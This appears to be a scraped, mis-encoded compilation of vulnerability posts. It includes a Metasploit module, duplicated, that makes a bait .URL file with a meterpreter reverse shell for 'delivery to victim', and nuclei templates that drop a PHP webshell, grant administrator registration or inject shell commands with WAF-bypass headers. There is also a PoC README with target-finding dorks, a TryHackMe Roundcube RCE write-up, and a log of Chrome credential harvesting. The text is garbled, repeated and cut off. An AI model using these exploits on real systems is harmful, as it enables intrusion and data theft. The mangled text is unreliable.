posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š CVE-2025-33053 Exploit via Malicious .URL File and WebDAV æ¼æ´ç¼–å·ï¼š CVEï¼š 2025-33053 æ¼æ´ç±»å‹ï¼š æ–‡ä»¶ä¸Šä¼  æ¼æ´ç­‰çº§ï¼š é«˜å± æ¼æ´æè¿°ï¼š è¯¥æ¨¡å—åˆ›å»ºä¸€ä¸ªæ¶æ„çš„.URLæ–‡ä»¶ï¼Œåˆ©ç”¨CVE-2025-33053æ¼æ´ï¼Œå¯é€‰åœ°è®¾ç½®WebDAVæœåŠ¡å™¨ï¼Œç”Ÿæˆæœ‰æ•ˆè½½è·ï¼Œå°†å…¶æ”¾å…¥WebDAVç›®å½•ï¼Œå¹¶å¯ä»¥è‡ªåŠ¨å¯åŠ¨ç›‘å¬å™¨ã€‚ æ¥æºï¼š https://github.com/rapid7/metasploit-framework/blob/9e5dd0962abbafd41cb806fc8ba4630db3f9b26c/modules%2Fexploits%2Fwindows%2Ffileformat%2Fcve_2025_33053.rb ç±»å‹ï¼š rapid7/metasploit-framework:github issues POCè¯¦æƒ…123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101require 'fileutils'class MetasploitModule < Msf::Exploit::Remote Rank = NormalRanking def initialize(info = {}) super(update_info(info, 'Name' => 'CVE-2025-33053 Exploit via Malicious .URL File and WebDAV', 'Description' => %q{ This module creates a malicious .URL file that abuses CVE-2025-33053, optionally sets up a WebDAV server, generates a payload, places it into the WebDAV directory, and can launch a listener automatically. }, 'Author' => ['Dev Bui Hieu'], 'License' => MSF_LICENSE, 'DisclosureDate' => '2025-06-11', 'References' => [ ['CVE', '2025-33053'], ['URL', 'https://github.com/DevBuiHieu/CVE-2025-33053-Proof-Of-Concept'] ], 'Platform' => 'win', 'Arch' => ARCH_X64, 'Targets' => [ ['Windows (generic)', {}] ], 'DefaultTarget' => 0 )) register_options( [ OptString.new('LHOST', [true, 'Local host for reverse connection']), OptInt.new('LPORT', [true, 'Local port for reverse connection', 4444]), OptString.new('PAYLOAD', [true, 'Payload to generate', 'windows/x64/meterpreter/reverse_tcp']), OptBool.new('GEN_PAYLOAD', [true, 'Generate payload and move to WebDAV directory', true]), OptBool.new('START_LISTENER', [true, 'Start handler after setup', true]), OptString.new('WEBDAV_DIR', [true, 'WebDAV directory path', '/var/www/webdav']), OptString.new('OUTFILE', [true, 'Output URL file name', 'bait.url']), OptString.new('LOLBAS_EXE', [true, 'Path to trusted binary (LOLBAS)', 'C:\\Program Files\\Internet Explorer\\iediagcmd.exe']), OptString.new('ICON_PATH', [true, 'Icon file path', 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe']), OptInt.new('ICON_INDEX', [true, 'Icon index in icon file', 13]), OptString.new('MODIFIED_HEX', [true, 'Modified timestamp in hex', '20F06BA06D07BD014D']) ] ) end def run lhost = datastore['LHOST'] lport = datastore['LPORT'] payload_type = datastore['PAYLOAD'] webdav_dir = datastore['WEBDAV_DIR'] gen_payload = datastore['GEN_PAYLOAD'] start_listener = datastore['START_LISTENER'] print_status("Creating WebDAV directory if not exists...") FileUtils.mkdir_p(webdav_dir) unless File.directory?(webdav_dir) if gen_payload exe_path = File.join(webdav_dir, 'payload.exe') print_good("Generating payload at: #{exe_path}") generate_payload_exe(payload_type, lhost, lport, exe_path) end unc_path = "\\#{lhost}\\#{File.basename(webdav_dir)}\\" url_content = <<~EOF [InternetShortcut] URL=#{datastore['LOLBAS_EXE']} WorkingDirectory=#{unc_path} ShowCommand=7 IconIndex=#{datastore['ICON_INDEX']} IconFile=#{datastore['ICON_PATH']} Modified=#{datastore['MODIFIED_HEX']} EOF url_file = File.join(Msf::Config.local_directory, datastore['OUTFILE']) File.write(url_file, url_content) print_good(".URL file written to: #{url_file}") if start_listener print_status("Starting handler as background job...") handler = framework.exploits.create('multi/handler') handler.datastore['PAYLOAD'] = payload_type handler.datastore['LHOST'] = lhost handler.datastore['LPORT'] = lport handler.exploit_simple('RunAsJob' => true) end print_status("Module complete. Deliver #{url_file} to victim.") end def generate_payload_exe(payload, lhost, lport, output_path) exe = framework.payloads.create(payload) exe.datastore['LHOST'] = lhost exe.datastore['LPORT'] = lport raw = exe.generate exe_file = Rex::Text.to_win32pe(raw, exe.arch) File.open(output_path, 'wb') { |f| f.write(exe_file) } endend

'fileutils'class MetasploitModule < Msf::Exploit::Remote Rank = NormalRanking def initialize(info = {}) super(update_info(info, 'Name' => 'CVE-2025-33053 Exploit via Malicious .URL File and WebDAV', 'Description' => %q{ This module creates a malicious .URL file that abuses CVE-2025-33053, optionally sets up a WebDAV server, generates a payload, places it into the WebDAV directory, and can launch a listener automatically. }, 'Author' => ['Dev Bui Hieu'], 'License' => MSF_LICENSE, 'DisclosureDate' => '2025-06-11', 'References' => [ ['CVE', '2025-33053'], ['URL', 'https://github.com/DevBuiHieu/CVE-2025-33053-Proof-Of-Concept'] ] )) register_options( [ OptString.new('LHOST', [true, 'Local host for reverse connection']), OptInt.new('LPORT', [true, 'Local port for reverse connection', 4444]), OptString.new('PAYLOAD', [true, 'Payload to generate', 'windows/x64/meterpreter/reverse_tcp']), OptBool.new('GEN_PAYLOAD', [true, 'Generate payload and move to WebDAV directory', true]), OptBool.new('START_LISTENER', [true, 'Start handler after setup', true]), OptString.new('WEBDAV_DIR', [true, 'WebDAV directory path', '/var/www/webdav']), OptString.new('OUTFILE', [true, 'Output URL file name', 'bait.url']), OptString.new('LOLBAS_EXE', [true, 'Path to trusted binary (LOLBAS)', 'C:\\Program Files\\Internet Explorer\\iediagcmd.exe']), OptString.new('ICON_PATH', [true, 'Icon file path', 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe']), OptInt.new('ICON_INDEX', [true, 'Icon index in icon file', 13]), OptString.new('MODIFIED_HEX', [true, 'Modified timestamp in hex', '20F06BA06D07BD014D']) ] ) end def run lhost = datastore['LHOST'] lport = datastore['LPORT'] payload_type = datastore['PAYLOAD'] webdav_dir = datastore['WEBDAV_DIR'] gen_payload = datastore['GEN_PAYLOAD'] start_listener = datastore['START_LISTENER'] print_status("Creating WebDAV directory if not exists...") FileUtils.mkdir_p(webdav_dir) unless File.directory?(webdav_dir) if gen_payload exe_path = File.join(webdav_dir, 'payload.exe') print_good("Generating payload at: #{exe_path}") generate_payload_exe(payload_type, lhost, lport, exe_path) end unc_path = "\\\\#{lhost}\\#{File.basename(webdav_dir)}\\" url_content = <<~EOF [InternetShortcut] URL=#{datastore['LOLBAS_EXE']} WorkingDirectory=#{unc_path} ShowCommand=7 IconIndex=#{datastore['ICON_INDEX']} IconFile=#{datastore['ICON_PATH']} Modified=#{datastore['MODIFIED_HEX']} EOF url_file = File.join(Msf::Config.local_directory, datastore['OUTFILE']) File.write(url_file, url_content) print_good(".URL file written to: #{url_file}") if start_listener print_status("Starting handler as background job...") handler = framework.exploits.create('multi/handler') handler.datastore['PAYLOAD'] = payload_type handler.datastore['LHOST'] = lhost handler.datastore['LPORT'] = lport handler.exploit_simple('RunAsJob' => true) end print_status("Module complete. Deliver #{url_file} to victim.") end def generate_payload_exe(payload, lhost, lport, output_path) exe = framework.payloads.create(payload) exe.datastore['LHOST'] = lhost exe.datastore['LPORT'] = lport raw = exe.generate exe_file = Rex::Text.to_win32pe(raw, exe.arch) File.open(output_path, 'wb') { |f| f.write(exe_file) } endend

posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š WordPress Likes and Dislikes Plugin SQLæ³¨å…¥æ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-5287 æ¼æ´ç±»å‹ï¼š SQLæ³¨å…¥ æ¼æ´ç­‰çº§ï¼š é«˜å± æ¼æ´æè¿°ï¼š WordPress Likes and Dislikes Plugin â‰¤ 1.0.0ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªæœªè®¤è¯çš„SQLæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡my_likes_dislikes_action AJAXåŠ¨ä½œä¸­çš„postå‚æ•°è¿›è¡ŒåŸºäºæ—¶é—´çš„ç›²æ³¨ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿæ•°æ®æ³„éœ²æˆ–è¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚ äº§å“å‚å•†ï¼š WordPress äº§å“åç§°ï¼š WordPress Likes and Dislikes Plugin å½±å“ç‰ˆæœ¬ï¼š â‰¤ 1.0.0 æœç´¢è¯­æ³•ï¼š body=â€/wp-admin/admin-ajax.phpâ€ or body=â€my_likes_dislikes_actionâ€ æ¥æºï¼š https://github.com/RootHarpy/CVE-2025-5287 ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ CVE-2025-5287.py README.md æ¥æºæ¦‚è¿°CVE-2025-5287 PoCUnauthenticated SQL Injection exploit for WordPress Likes and Dislikes Plugin â‰¤ 1.0.0 ğŸ“– DescriptionThis Python script is a proof-of-concept (PoC) exploit for CVE-2025-5287, targeting a vulnerability in the WordPress Likes and Dislikes Plugin â‰¤ 1.0.0.The vulnerability allows unauthenticated attackers to perform time-based blind SQL injection via the post parameter in the my_likes_dislikes_action AJAX action, potentially leading to sensitive data exposure or further exploitation. ğŸ“Œ Usageâ–¶ï¸ Requirements: Python 3 requests library Install required libraries: 1pip install requests Arguments: --url / -u : Target WordPress site URL (with HTTP/HTTPS) --sleep / -s : Sleep time (seconds) for detecting SQL delay (default: 5) â–¶ï¸ Run the Exploit:1python3 CVE-2025-5287-poc.py --url http://target.com Or with a custom sleep time: 1python3 CVE-2025-5287-poc.py --url http://target.com --sleep 7 ğŸ” Finding TargetsYou can use Fofa to discover potentially vulnerable WordPress installations running the plugin. Fofa Dork: 1body="/wp-admin/admin-ajax.php" Or to narrow down plugin-specific references: 1body="my_likes_dislikes_action" Search on: https://fofa.info ğŸ‘¨â€ğŸ’» AuthorMd Shoriful Islam (RootHarpy) ğŸ“œ DisclaimerThis tool is created for educational and authorized penetration testing purposes only. Unauthorized use of this tool against systems without explicit permission is illegal.

(fearsoff-org/CVE-2025-49113) 10 jun 2025 Primeiros relatos de exploraÃ§Ã£o em massa. 2 â€“ Onde estava o problemaCÃ³digo vulnerÃ¡vel (1.6.10)1234567// program/actions/settings/upload.php (linha 30 aprox.)$from = rcube_utils::get_input_string('_from', rcube_utils::INPUT_GET);$type = preg_replace('/(add|edit)-/', '', $from);// â€¦ mais abaixo$rcmail->session->append($type . '.files', $id, $attachment); A entrada _from chega Ã­ntegra do GET, vira parte do nome de um nÃ³ na sessÃ£o e,durante o primeiro append(), o Roundcube faz: 123456789// program/actions/settings/upload.php (linha 30 aprox.)$from = rcube_utils::get_input_string('_from', rcube_utils::INPUT_GET);$type = preg_replace('/(add|edit)-/', '', $from);// â€¦ mais abaixo$rcmail->session->append($type . '.files', $id, $attachment); Se o arquivo existir, o RCE funcionou. 6 â€“ MitigaÃ§Ãµes Atualize imediatamente para â‰¥ 1.6.11 ou â‰¥ 1.5.11. Sem update? Bloqueie qualquer _from contendo %22, %7C, !, . ou bytes de controle via WAF ou rewrite. Desative funÃ§Ãµes perigosas (proc_open, exec, etc.) em php.ini quando possÃ­vel. Restrinja uploads no painel de configuraÃ§Ãµes e monitore logs. 7 - Lab - TryHackme - WriteUp1. Recon Abrir a VM (MACHINE_IP) e o AttackBox. Acessar http://MACHINE_IP/roundcube com: usuÃ¡rio: ellieptic senha: ChangeMe123 Isso vai funcionar e vai logar normalmente: 2. Montar o exploitApÃ³s verificar que estÃ¡ tudo up, vamos executar o exploit, para isso vamos acessar a PoC postada no github informada anteriormente e fazer um gitclone: 1234mkdir tmpcd tmpgit clone https://github.com/fearsoff-org/CVE-2025-49113cd CVE-2025-49113 3. Ã€s vezes ele mostra erro de CSRF; ignore e siga para o prÃ³ximo passo,porque o comando costuma ter sido executado mesmo assim. 4. Conectar na shellSe a bind shell deu certo, ela ta escutando na porta 1337 que passamos, so fazermos a conexÃ£o nela agora: nc MACHINE_IP 1337 Shell obtida. 5. Respondendo as questÃµesQuestÃµes e respostas UsuÃ¡rio Maggie Pergunta: Um dos usuÃ¡rios tem o primeiro nome Maggie. Qual Ã© o sobrenome dela? Resposta: Byte Para resolver essa questÃ£o podiamos dar um cat em /etc/passwd grepando o usuÃ¡rio da maggie, ou simplesmente dando um lsem /home Flag em /etc Pergunta: Qual Ã© o valor do sinalizador salvo em /etc? Resposta: THM{ICE_CUBE_DESERIALISATION} Para resolver isso, dei um cat /etc/flag* e por sorte o nome do arquivo era flag e com isso conseguimos capturar. 7 â€“ ReferÃªncias Commit 1.6.11 â€“ https://github.com/roundcube/roundcubemail/commit/0376f69e958a8fef7f6f09e352c541b4e7729c4d Commit 1.5.11 â€“ https://github.com/roundcube/roundcubemail/commit/7408f31379666124a39f9cb1018f62bc5e2dc695 FearsOff write-up â€“ https://fearsoff.org/research/roundcube OffSec blog â€“ https://www.offsec.com/blog/cve-2025-49113/ offsec.com TryHackme - TryHackMe | Roundcube: CVE-2025-49113 GHSA advisory â€“ https://github.com/advisories/GHSA-8j8w-wwqc-x596 github.com

posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š BigAnt Office Messenger SQLæ³¨å…¥æ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2024-54761 æ¼æ´ç±»å‹ï¼š SQLæ³¨å…¥ æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š BigAnt Office Messenger 5.6.06å­˜åœ¨ä¸¥é‡çš„SQLæ³¨å…¥æ¼æ´ï¼Œå…è®¸è¿œç¨‹æœªè®¤è¯æ”»å‡»è€…é€šè¿‡æ»¥ç”¨MySQLçš„SELECT â€¦ INTO OUTFILEåŠŸèƒ½æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚æ”»å‡»é“¾æœ‰æ¡ä»¶åœ°å°†ç¬æ€PHP webshellå†™å…¥ç£ç›˜ï¼Œæ‰§è¡Œsystem('id')ï¼Œå¹¶é€šè¿‡unlink()ç«‹å³è‡ªæ¯ã€‚è¿™ä¸ä¼šç•™ä¸‹å¯è¿½è¸ªçš„ç—•è¿¹ï¼Œä¸”æ— éœ€è®¤è¯ã€‚åˆ©ç”¨æ­¤æ¼æ´éœ€è¦MySQLçš„FILEæƒé™å’Œå¯å†™çš„webrootç›®å½•ï¼Œè¿™åœ¨Windowsä¸Šçš„é»˜è®¤æˆ–é”™è¯¯é…ç½®éƒ¨ç½²ä¸­å¸¸è§ã€‚æ­¤CVEæ¨¡ä»¿äº†ä¸€ä¸ªå®Œæ•´çš„æ€ä¼¤é“¾ï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿåœ¨ä¸åˆ°3ä¸ªè¯·æ±‚çš„æ—¶é—´å†…ä»æœªè®¤è¯è¾“å…¥åˆ°ç²¾ç¡®çš„çŸ­æš‚ä»£ç æ‰§è¡Œã€‚å¨èƒè¡Œä¸ºè€…å¯èƒ½å°†æ­¤ä½œä¸ºé’ˆå¯¹åŸºäºWindowsçš„å†…éƒ¨åä½œè½¯ä»¶çš„åˆå§‹ç«‹è¶³ç‚¹å‘é‡ï¼Œè¿™äº›è½¯ä»¶å…·æœ‰æå‡çš„æœåŠ¡ä¸Šä¸‹æ–‡ã€‚ äº§å“å‚å•†ï¼š BigAntSoft äº§å“åç§°ï¼š Office Messenger å½±å“ç‰ˆæœ¬ï¼š 5.6.06 æœç´¢è¯­æ³•ï¼š http.html:â€BigAnt Office Messengerâ€, body=â€BigAnt Officeâ€ æ¥æºï¼š https://github.com/projectdiscovery/nuclei-templates/blob/9c4372196279263e8edb59539ab89e3943857b96/http%2Fcves%2F2025%2FCVE-2024-54761.yaml ç±»å‹ï¼š projectdiscovery/nuclei-templates:github issues POCè¯¦æƒ…123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106id: cve-2024-54761-chaininfo: name: BigAnt Office Messenger 5.6.06 - Stealth RCE via SQL Injection (Ephemeral OUTFILE Chain) author: 3th1c_yuk1, x-stp severity: critical description: | A critical SQL injection vulnerability in BigAnt Office Messenger 5.6.06 allows remote unauthenticated attackers to execute arbitrary system commands by abusing MySQL's SELECT ... INTO OUTFILE functionality. The attack chain conditionally writes a transient PHP webshell to disk, executes `system('id')`, and immediately self-destructs via unlink(). This leaves no traceable artifact and requires no authentication. Exploitation is contingent on MySQL's FILE privilege and a writable webroot directory, commonly observed in default or misconfigured deployments on Windows. This CVE mimics a full killchain, enabling attackers to move from unauthenticated input to precise ephemeral code execution â€” all in under 3 requests. Threat actors may leverage this as an initial foothold vector in targeted intrusions against Windows-based internal collaboration software with elevated service contexts. reference: - https://github.com/nscan9/CVE-2024-54761-BigAnt-Office-Messenger-5.6.06-RCE-via-SQL-Injection - https://nvd.nist.gov/vuln/detail/CVE-2024-54761 metadata: verified: true max-request: 5 vendor: BigAntSoft product: Office Messenger shodan-query: http.html:"BigAnt Office Messenger" fofa-query: body="BigAnt Office" exploit-type: RCE cwe-id: CWE-89 attack-surface: remote privilege-required: none user-interaction: none exploit-chain: sql-injectionâ†’file-writeâ†’rceâ†’self-clean tags: cve,cve2024,bigant,sql-injection,rce,webroot,ephemeral,unlink,windows,filewrite,chain,killchain,noauth,criticalvariables: checkfile: "{{randstr}}.txt" shellfile: "{{randstr}}.phtml" marker: "BigAntOM-{{randstr}}" payload: "<?php echo '{{marker}}'; system('id'); unlink(__FILE__); ?>"http: - id: outfile-check raw: - | GET /index.php/Admin/user/index/clientid/1.html?dev_code=';SELECT+'{{marker}}'+INTO+OUTFILE+'C:/Program Files (x86)/BigAntSoft/IM Console/im_webserver/htdocs/{{checkfile}}'-- HTTP/1.1 Host: {{Hostname}} matchers: - type: status status: - 200 - id: verify-checkfile method: GET path: - "{{BaseURL}}/{{checkfile}}" matchers: - type: word part: body words: - "{{marker}}" - id: drop-shell raw: - | GET /index.php/Admin/user/index/clientid/1.html?dev_code=';SELECT+CHAR({{payload | to_char }})+INTO+OUTFILE+'C:/Program Files (x86)/BigAntSoft/IM Console/im_webserver/htdocs/{{shellfile}}'-- HTTP/1.1 Host: {{Hostname}} stop-at-first-match: true matchers: - type: status status: - 200 - id: execute-shell raw: - | GET /{{shellfile}} HTTP/1.1 Host: {{Hostname}} matchers: - type: word condition: and part: body words: - "{{marker}}" - "uid=" - "gid=" - "groups=" - id: cleanup-confirmation method: GET path: - "{{BaseURL}}/{{shellfile}}" matchers: - type: status status: - 404

posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š WP GDPR Compliance æœªæˆæƒè°ƒç”¨ä»»æ„æ“ä½œæˆ–æ›´æ–°ä»»æ„é€‰é¡¹æ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2018-19207 æ¼æ´ç±»å‹ï¼š æœªæˆæƒè®¿é—® æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š WP GDPR Complianceæ’ä»¶å…è®¸æœªè®¤è¯ç”¨æˆ·æ‰§è¡Œä»»ä½•æ“ä½œå¹¶æ›´æ–°ä»»ä½•æ•°æ®åº“å€¼ã€‚æ­¤æ¼æ´æºäºIncludes/Ajax.phpæ–‡ä»¶ä¸­ç¼ºä¹é€‚å½“çš„éªŒè¯ã€‚ äº§å“å‚å•†ï¼š van-ons äº§å“åç§°ï¼š wp-gdpr-compliance å½±å“ç‰ˆæœ¬ï¼š < 1.4.3 æœç´¢è¯­æ³•ï¼š wp-content/plugins/wp-gdpr-compliance/ æ¥æºï¼š https://github.com/projectdiscovery/nuclei-templates/blob/bbdc8b1a1d6adc14837dbc1b0b3110c23199b517/http%2Fcves%2F2018%2FCVE-2018-19207.yaml ç±»å‹ï¼š projectdiscovery/nuclei-templates:github issues POCè¯¦æƒ…12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576id: CVE-2018-19207info: name: WP GDPR Compliance < 1.4.3 - Unauthenticated Call Any Action or Update Any Option author: iamnoooob,pdresearch severity: critical description: | The WP GDPR Compliance plugin allows unauthenticated users to execute any action and update any database value. This vulnerability is due to the lack of proper validation in the Includes/Ajax.php file. reference: - https://wpvulndb.com/vulnerabilities/9157 - https://github.com/aeroot/WP-GDPR-Compliance-Plugin-Exploit classification: cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2018-19207 cwe-id: CWE-425 epss-score: 0.80584 epss-percentile: 0.99068 cpe: cpe:2.3:a:van-ons:wp-gdpr-compliance:*:*:*:*:*:wordpress:*:* metadata: vendor: van-ons product: wp-gdpr-compliance framework: wordpress publicwww-query: "wp-content/plugins/wp-gdpr-compliance/" verified: true tags: cve,cve2018,wordpress,wp-plugin,wp-gdpr-compliance,rce,kevhttp: - raw: - | GET / HTTP/1.1 Host: {{Hostname}} redirects: true extractors: - type: regex name: nonce part: body regex: - 'var wpgdprcData.*"ajaxSecurity":"([a-z0-9]+)"' group: 1 internal: true - raw: - | POST /wp-admin/admin-ajax.php HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded action=wpgdprc_process_action&security={{nonce}}&data={"type":"save_setting","append":false,"option":"users_can_register","value":"1"} - | POST /wp-admin/admin-ajax.php HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded action=wpgdprc_process_action&security={{nonce}}&data={"type":"save_setting","append":false,"option":"default_role","value":"administrator"} matchers-condition: and matchers: - type: word part: body_2 words: - '"message":""' - '"error":""' condition: and - type: word part: content_type_2 words: - 'application/json'

posts.title: A vulnerability, which was classified as critical, has been found in D-Link DIR-632 FW103B08
posts.text: é“¾æ¥ï¼š https://github.com/advisories/GHSA-3gvh-jvc6-266h CVSS è¯„åˆ†ï¼š 9.8 å‚è€ƒé“¾æ¥ï¼š https://nvd.nist.gov/vuln/detail/CVE-2025-6121 https://github.com/xiaobor123/vul-finds/tree/main/vul-find-dir632-dlink-get_pure_content https://github.com/xiaobor123/vul-finds/tree/main/vul-find-dir632-dlink-get_pure_content#poc https://vuldb.com/?ctiid.312590 https://vuldb.com/?id.312590 https://vuldb.com/?submit.592574 https://www.dlink.com https://github.com/advisories/GHSA-3gvh-jvc6-266h æè¿°ï¼š A vulnerability, which was classified as critical, has been found in D-Link DIR-632 FW103B08. Affected by this issue is the function get_pure_content of the component HTTP POST Request Handler. The manipulation of the argument Content-Length leads to stack-based buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. This vulnerability only affects products that are no longer supported by the maintainer.

posts.title: enum_chrome module SYSTEMæƒé™ä¸‹å´©æºƒæ¼æ´
posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š enum_chrome module SYSTEMæƒé™ä¸‹å´©æºƒæ¼æ´ æ¼æ´ç±»å‹ï¼š æƒé™ç»•è¿‡ æ¼æ´ç­‰çº§ï¼š ä¸­å± æ¼æ´æè¿°ï¼š åœ¨metasploit-frameworkçš„enum_chromeæ¨¡å—ä¸­ï¼Œå½“ä»¥SYSTEMæƒé™è¿è¡Œæ—¶ä¼šå¯¼è‡´å´©æºƒï¼Œå¹¶ä¸”ä¼šè¯å¤„äºä¸å¯ç”¨çŠ¶æ€ï¼Œç›´åˆ°ç”¨æˆ·æ‰§è¡Œrev2selfå‘½ä»¤æ¢å¤steal_tokenè°ƒç”¨ã€‚æ­¤é—®é¢˜åœ¨64ä½çš„Server 2019å®ä¾‹ä¸Šè¢«å‘ç°ï¼Œä¸”åœ¨ä½¿ç”¨#18558çš„æ›´æ”¹åå‡ºç°ã€‚é€šè¿‡ç¦ç”¨tokençªƒå–å’Œè¿ç§»é€»è¾‘å¯ä»¥ä¸´æ—¶è§£å†³æ­¤é—®é¢˜ï¼Œä½†å¯èƒ½å½±å“è‡ªåŠ¨è§£å¯†åŠŸèƒ½ã€‚ äº§å“å‚å•†ï¼š rapid7 äº§å“åç§°ï¼š metasploit-framework æ¥æºï¼š https://github.com/rapid7/metasploit-framework/issues/18559 ç±»å‹ï¼š rapid7/metasploit-framework:github issues æ¥æºæ¦‚è¿°When running the post/windows/gather/enum_chrome module, it will crash when run as NT AUTHORITY\SYSTEM. I noticed this issue while making the changes in #18558. After the module fails, it should also be noted that the sessions is left in a pretty unusable state until the user runs rev2self to revert the steal_token call. The target is a 64-bit Server 2019 instance and the changes from #18558 are loaded on my test branch. 123456789101112131415161718192021222324252627282930313233343536meterpreter > getuidServer username: NT AUTHORITY\SYSTEMmeterpreter > sysinfoComputer : DCOS : Windows 2016+ (10.0 Build 17763).Architecture : x64System Language : en_USDomain : MSFLABLogged On Users : 9Meterpreter : x64/windowsmeterpreter > run post/windows/gather/enum_chrome[*] Impersonating token: 1332[-] Cannot impersonate: stdapi_sys_config_steal_token: Operation failed: Access is denied.[-] Post failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.[-] Call stack:[-] /home/smcintyre/Repositories/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb:46:in `getsid'[-] /home/smcintyre/Repositories/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb:54:in `is_system?'[-] /home/smcintyre/Repositories/metasploit-framework/lib/msf/core/post/windows/priv.rb:128:in `is_system?'[-] /home/smcintyre/Repositories/metasploit-framework/modules/post/windows/gather/enum_chrome.rb:349:in `run'meterpreter > getuid[-] stdapi_sys_config_getuid: Operation failed: Access is denied.meterpreter > sysinfo[-] stdapi_sys_config_getuid: Operation failed: Access is denied.meterpreter > rev2selfmeterpreter > getuidServer username: NT AUTHORITY\SYSTEMmeterpreter > sysinfoComputer : DCOS : Windows 2016+ (10.0 Build 17763).Architecture : x64System Language : en_USDomain : MSFLABLogged On Users : 9Meterpreter : x64/windowsmeterpreter > After implementing the following quick workaround the module runs as NT AUTHORITY\SYSTEM but with a warning about automatic decryption not being possible. The module also works as intended after migrating into a process running as a local admin. 12345678910111213141516diff --git a/modules/post/windows/gather/enum_chrome.rb b/modules/post/windows/gather/enum_chrome.rbindex 6e7e169425..181d87028c 100644--- a/modules/post/windows/gather/enum_chrome.rb+++ b/modules/post/windows/gather/enum_chrome.rb@@ -326,9 +326,9 @@ class MetasploitModule < Msf::Post # If we can impersonate a token, we use that first. # If we can't, we'll try to MIGRATE (more aggressive) if the user wants to- got_token = steal_token+ got_token = false # steal_token if !got_token && datastore['MIGRATE']- migrate_success = migrate+ migrate_success = false # migrate end host = session.session_host Testing Output 123456789101112131415161718192021222324252627282930meterpreter > getuidServer username: NT AUTHORITY\SYSTEMmeterpreter > sysinfoComputer : DCOS : Windows 2016+ (10.0 Build 17763).Architecture : x64System Language : en_USDomain : MSFLABLogged On Users : 9Meterpreter : x64/windowsmeterpreter > run post/windows/gather/enum_chrome[*] Running as SYSTEM, extracting user list...[!] (Automatic decryption will not be possible. You might want to manually migrate, or set "MIGRATE=true")[*] Users found: smcintyre[*] Extracting data for user 'smcintyre'...[+] Downloaded Web Data to '/home/smcintyre/.msf4/loot/20231120171644_default_192.168.159.10_chrome.raw.WebD_079520.txt'[-] Cookies not found[+] Downloaded History to '/home/smcintyre/.msf4/loot/20231120171645_default_192.168.159.10_chrome.raw.Histo_048081.txt'[+] Downloaded Login Data to '/home/smcintyre/.msf4/loot/20231120171646_default_192.168.159.10_chrome.raw.Login_624182.txt'[-] Bookmarks not found[+] Downloaded Preferences to '/home/smcintyre/.msf4/loot/20231120171646_default_192.168.159.10_chrome.raw.Prefe_808569.txt'[*] Extensions installed: [*] => Web Store[*] => Google Docs Offline[*] => Chrome PDF Viewer[*] => Google Network Speech[*] => Google Hangouts[*] => Chrome Web Store Paymentsmeterpreter > Iâ€™m not sure why the token impersonation or automatic migration is required. But it looks like removing it causes the module work work as I would expect it to work. It should be noted that if the session is running as SYSTEM and the module migrates into a process running as a user, it wonâ€™t be able to migrate back into the SYSTEM process due to the loss of privileges. My guess is that the MIGRATE option was originally intended to be used to migrate into the explorer.exe process owned by the current non-SYSTEM user. Further testing for edge cases should probably take place before just removing the token impersonation and migration logic.

It has been classified as critical. This affects the function strcpy of the file /goform/setSysAdm of the component API. The manipulation of the argument passwd1 leads to buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

Includes polymorphic payloads, encoding, advanced WAF bypass headers, and flexible body injection points. reference: - https://github.com/jbaines-r7/overkill - https://vulncheck.com/xdb/533b5e83b1eb tags: cve,cve2020,qnap,rce,command-injection,authenticated,bounty,obfuscation,waf-bypass metadata: shodan-query: 'product:"qnap"' max-request: 12 verified: truehttp: - method: POST path: - "{{BaseURL}}/cgi-bin/qapp_platform.cgi" headers: User-Agent: "{{user_agent}}" X-Forwarded-For: "127.0.0.1" X-Originating-IP: "127.0.0.1" X-Remote-IP: "127.0.0.1" X-Remote-Addr: "127.0.0.1" X-Requested-With: "XMLHttpRequest" Accept-Language: "en-US,en;q=0.9" Referer: "{{BaseURL}}/dashboard" Origin: "{{BaseURL}}" Content-Type: "application/json" payloads: payload: - "|id|" - ";id;" - "`id`" - "$(id)" - "|echo aWQK|base64 -d|sh" - "i\"\"d" # bypass some filters - "$(which\\ id)" - "$(ec\\ho uid=999)" # fake echo payload - "`whoami`" - "`cat /etc/passwd | grep admin`" - "|sleep${IFS}1|id" - ";curl${IFS}example.com;" # dummy outbound payload user_agent: - "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" - "Mozilla/5.0 (Macintosh; 